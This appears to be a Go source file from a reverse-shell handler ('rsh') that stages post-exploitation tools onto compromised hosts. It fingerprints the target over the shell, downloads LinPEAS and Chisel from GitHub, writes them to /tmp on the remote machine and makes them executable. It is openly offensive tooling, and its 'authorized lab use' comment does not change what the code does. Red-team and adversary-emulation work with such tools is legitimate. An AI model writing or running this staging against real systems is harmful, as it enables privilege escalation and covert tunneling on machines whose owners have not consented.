// For authorized lab use only. This staging workflow is intended for
// red-team simulation and adversary emulation in controlled environments.
package tui

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	listenerPkg "codeberg.org/asuna/rsh/internal/listener"
)

const (
	postExRemoteDir = "/tmp"
	postExUserAgent = "rsh/0.1.0 (authorized lab use only)"
)

type postExUploadRequestMsg struct {
	shell   *listenerPkg.Shell
	toolIDs []string
}

type remoteHostInfo struct {
	OS      string
	Arch    string
	RawOS   string
	RawArch string
}

func (h remoteHostInfo) Label() string {
	if h.OS == "" || h.Arch == "" {
		return "unknown"
	}
	return h.OS + "/" + h.Arch
}

type stagedToolResult struct {
	ToolID     string
	ToolName   string
	LocalPath  string
	RemotePath string
	SourceURL  string
}

type postExUploadDoneMsg struct {
	shellID  int
	host     remoteHostInfo
	uploaded []stagedToolResult
	err      error
}

type postExTool struct {
	ID          string
	Name        string
	Description string
	Resolve     func(remoteHostInfo) (resolvedToolAsset, error)
}

type resolvedToolAsset struct {
	ToolID     string
	ToolName   string
	LocalPath  string
	RemoteName string
	SourceURL  string
}

type githubRelease struct {
	TagName string               `json:"tag_name"`
	Assets  []githubReleaseAsset `json:"assets"`
}

type githubReleaseAsset struct {
	Name               string `json:"name"`
	BrowserDownloadURL string `json:"browser_download_url"`
}

var (
	chiselLinuxAssetPattern = regexp.MustCompile(`^chisel_.*_linux_([a-z0-9]+)\.gz$`)
	postExTools             = []postExTool{
		{
			ID:          "linpeas",
			Name:        "LinPEAS",
			Description: "Linux privilege-escalation enumeration script",
			Resolve:     resolveLinpeasAsset,
		},
		{
			ID:          "chisel",
			Name:        "Chisel",
			Description: "Port-forwarding and SOCKS tunneling helper",
			Resolve:     resolveChiselAsset,
		},
	}
)

func postExToolByID(id string) (postExTool, bool) {
	for _, tool := range postExTools {
		if tool.ID == id {
			return tool, true
		}
	}
	return postExTool{}, false
}

func postExToolNames(ids []string) []string {
	names := make([]string, 0, len(ids))
	for _, id := range ids {
		if tool, ok := postExToolByID(id); ok {
			names = append(names, tool.Name)
		}
	}
	return names
}

func stagePostExTools(shell *listenerPkg.Shell, toolIDs []string) tea.Msg {
	msg := postExUploadDoneMsg{shellID: shell.ID}

	host, err := detectRemoteHost(shell.Conn)
	if err != nil {
		msg.err = err
		return msg
	}
	msg.host = host

	for _, toolID := range toolIDs {
		tool, ok := postExToolByID(toolID)
		if !ok {
			msg.err = fmt.Errorf("unknown tool %q", toolID)
			return msg
		}

		asset, err := tool.Resolve(host)
		if err != nil {
			msg.err = err
			return msg
		}

		remotePath := path.Join(postExRemoteDir, asset.RemoteName)
		if err := uploadFile(shell.Conn, asset.LocalPath, remotePath); err != nil {
			msg.err = fmt.Errorf("upload %s: %w", tool.Name, err)
			return msg
		}
		if err := sendRemoteCommand(shell.Conn, fmt.Sprintf("chmod 755 %s 2>/dev/null\n", shellQuote(remotePath))); err != nil {
			msg.err = fmt.Errorf("chmod %s: %w", tool.Name, err)
			return msg
		}

		msg.uploaded = append(msg.uploaded, stagedToolResult{
			ToolID:     asset.ToolID,
			ToolName:   asset.ToolName,
			LocalPath:  asset.LocalPath,
			RemotePath: remotePath,
			SourceURL:  asset.SourceURL,
		})
	}

	return msg
}

func detectRemoteHost(conn net.Conn) (remoteHostInfo, error) {
	output, err := captureRemoteCommand(
		conn,
		"uname -s 2>/dev/null; printf '|'; uname -m 2>/dev/null",
		4*time.Second,
	)
	if err != nil {
		return remoteHostInfo{}, err
	}

	parts := strings.Split(strings.TrimSpace(output), "|")
	if len(parts) != 2 {
		return remoteHostInfo{}, fmt.Errorf("unexpected probe response %q", strings.TrimSpace(output))
	}

	rawOS := strings.TrimSpace(parts[0])
	rawArch := strings.TrimSpace(parts[1])
	osName := strings.ToLower(rawOS)
	if osName == "darwin" {
		osName = "macos"
	}

	arch, err := normalizeRemoteArch(rawArch)
	if err != nil {
		return remoteHostInfo{}, err
	}

	return remoteHostInfo{
		OS:      osName,
		Arch:    arch,
		RawOS:   rawOS,
		RawArch: rawArch,
	}, nil
}

func normalizeRemoteArch(raw string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(raw)) {
	case "x86_64", "amd64":
		return "amd64", nil
	case "aarch64", "arm64":
		return "arm64", nil
	case "i386", "i486", "i586", "i686", "386":
		return "386", nil
	case "armv7l", "armv7":
		return "armv7", nil
	case "armv6l", "armv6":
		return "armv6", nil
	default:
		return "", fmt.Errorf("unsupported remote architecture %q", raw)
	}
}

func resolveLinpeasAsset(host remoteHostInfo) (resolvedToolAsset, error) {
	if host.OS != "linux" {
		return resolvedToolAsset{}, fmt.Errorf("LinPEAS is only supported for Linux shells, got %s", host.Label())
	}

	cacheDir, err := postExCacheDir()
	if err != nil {
		return resolvedToolAsset{}, err
	}

	localPath, sourceURL, err := ensureGitHubLatestAsset(
		cacheDir,
		"peass-ng/PEASS-ng",
		func(asset githubReleaseAsset) bool {
			return asset.Name == "linpeas.sh"
		},
		"linpeas.sh",
		false,
	)
	if err != nil {
		return resolvedToolAsset{}, err
	}

	return resolvedToolAsset{
		ToolID:     "linpeas",
		ToolName:   "LinPEAS",
		LocalPath:  localPath,
		RemoteName: "linpeas.sh",
		SourceURL:  sourceURL,
	}, nil
}

func resolveChiselAsset(host remoteHostInfo) (resolvedToolAsset, error) {
	if host.OS != "linux" {
		return resolvedToolAsset{}, fmt.Errorf("Chisel staging is currently supported for Linux shells, got %s", host.Label())
	}

	cacheDir, err := postExCacheDir()
	if err != nil {
		return resolvedToolAsset{}, err
	}

	matcher := func(asset githubReleaseAsset) bool {
		matches := chiselLinuxAssetPattern.FindStringSubmatch(asset.Name)
		return len(matches) == 2 && matches[1] == host.Arch
	}

	localPath, sourceURL, err := ensureGitHubLatestAsset(
		cacheDir,
		"jpillora/chisel",
		matcher,
		"chisel",
		true,
	)
	if err != nil {
		return resolvedToolAsset{}, err
	}

	return resolvedToolAsset{
		ToolID:     "chisel",
		ToolName:   "Chisel",
		LocalPath:  localPath,
		RemoteName: "chisel",
		SourceURL:  sourceURL,
	}, nil
}

func postExCacheDir() (string, error) {
	root, err := os.UserCacheDir()
	if err != nil || root == "" {
		root = os.TempDir()
	}
	cacheDir := filepath.Join(root, "rsh", "postex")
	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
		return "", fmt.Errorf("create tool cache: %w", err)
	}
	return cacheDir, nil
}

func ensureGitHubLatestAsset(cacheDir, repo string, match func(githubReleaseAsset) bool, finalName string, gunzipAsset bool) (string, string, error) {
	release, err := fetchLatestGitHubRelease(repo)
	if err != nil {
		return "", "", err
	}

	var asset *githubReleaseAsset
	for i := range release.Assets {
		if match(release.Assets[i]) {
			asset = &release.Assets[i]
			break
		}
	}
	if asset == nil {
		return "", "", fmt.Errorf("no matching asset found in latest %s release", repo)
	}

	targetDir := filepath.Join(cacheDir, strings.ReplaceAll(repo, "/", "_"), release.TagName)
	if err := os.MkdirAll(targetDir, 0o755); err != nil {
		return "", "", fmt.Errorf("create cache directory: %w", err)
	}

	finalPath := filepath.Join(targetDir, finalName)
	if _, err := os.Stat(finalPath); err == nil {
		return finalPath, asset.BrowserDownloadURL, nil
	}

	if err := downloadGitHubAsset(asset.BrowserDownloadURL, finalPath, gunzipAsset); err != nil {
		return "", "", err
	}

	return finalPath, asset.BrowserDownloadURL, nil
}

func fetchLatestGitHubRelease(repo string) (githubRelease, error) {
	req, err := http.NewRequest(http.MethodGet, "https://api.github.com/repos/"+repo+"/releases/latest", nil)
	if err != nil {
		return githubRelease{}, err
	}
	req.Header.Set("User-Agent", postExUserAgent)
	req.Header.Set("Accept", "application/vnd.github+json")

	client := &http.Client{Timeout: 20 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return githubRelease{}, fmt.Errorf("fetch latest release for %s: %w", repo, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		return githubRelease{}, fmt.Errorf("fetch latest release for %s failed: %s %s", repo, resp.Status, strings.TrimSpace(string(body)))
	}

	var release githubRelease
	if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
		return githubRelease{}, fmt.Errorf("decode latest release for %s: %w", repo, err)
	}
	return release, nil
}

func downloadGitHubAsset(url, finalPath string, gunzipAsset bool) error {
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", postExUserAgent)

	client := &http.Client{Timeout: 90 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("download asset: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download asset failed: %s", resp.Status)
	}

	tmpPath := finalPath + ".tmp"
	if err := os.MkdirAll(filepath.Dir(finalPath), 0o755); err != nil {
		return err
	}

	f, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		return err
	}

	var writeErr error
	if gunzipAsset {
		gr, err := gzip.NewReader(resp.Body)
		if err != nil {
			f.Close()
			_ = os.Remove(tmpPath)
			return fmt.Errorf("gunzip asset: %w", err)
		}
		_, writeErr = io.Copy(f, gr)
		gr.Close()
	} else {
		_, writeErr = io.Copy(f, resp.Body)
	}
	closeErr := f.Close()
	if writeErr != nil {
		_ = os.Remove(tmpPath)
		return fmt.Errorf("write asset: %w", writeErr)
	}
	if closeErr != nil {
		_ = os.Remove(tmpPath)
		return closeErr
	}

	if err := os.Chmod(tmpPath, 0o755); err != nil {
		_ = os.Remove(tmpPath)
		return err
	}
	if err := os.Rename(tmpPath, finalPath); err != nil {
		_ = os.Remove(tmpPath)
		return err
	}
	return nil
}

func captureRemoteCommand(conn net.Conn, command string, timeout time.Duration) (string, error) {
	startMarker := fmt.Sprintf("__RSH_BEGIN_%d__", time.Now().UnixNano())
	endMarker := fmt.Sprintf("__RSH_END_%d__", time.Now().UnixNano())

	drainRemoteConn(conn, 120*time.Millisecond)

	payload := fmt.Sprintf(
		"printf %s; %s; printf %s\n",
		shellQuote(startMarker),
		command,
		shellQuote(endMarker),
	)
	if err := sendRemoteCommand(conn, payload); err != nil {
		return "", err
	}

	output, err := readRemoteUntilMarkers(conn, startMarker, endMarker, timeout)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(output), nil
}

func drainRemoteConn(conn net.Conn, wait time.Duration) {
	buf := make([]byte, 2048)
	for {
		_ = conn.SetReadDeadline(time.Now().Add(wait))
		if _, err := conn.Read(buf); err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			break
		}
	}
	_ = conn.SetReadDeadline(time.Time{})
}

func readRemoteUntilMarkers(conn net.Conn, startMarker, endMarker string, timeout time.Duration) (string, error) {
	var data bytes.Buffer
	buf := make([]byte, 4096)
	deadline := time.Now().Add(timeout)

	for {
		_ = conn.SetReadDeadline(deadline)
		n, err := conn.Read(buf)
		if n > 0 {
			data.Write(buf[:n])
			current := data.String()
			startIdx := strings.Index(current, startMarker)
			endIdx := strings.Index(current, endMarker)
			if startIdx >= 0 && endIdx > startIdx {
				_ = conn.SetReadDeadline(time.Time{})
				return current[startIdx+len(startMarker) : endIdx], nil
			}
		}
		if err != nil {
			_ = conn.SetReadDeadline(time.Time{})
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				return "", fmt.Errorf("timed out waiting for remote command output")
			}
			return "", err
		}
	}
}

func sendRemoteCommand(conn net.Conn, command string) error {
	_, err := io.WriteString(conn, command)
	return err
}
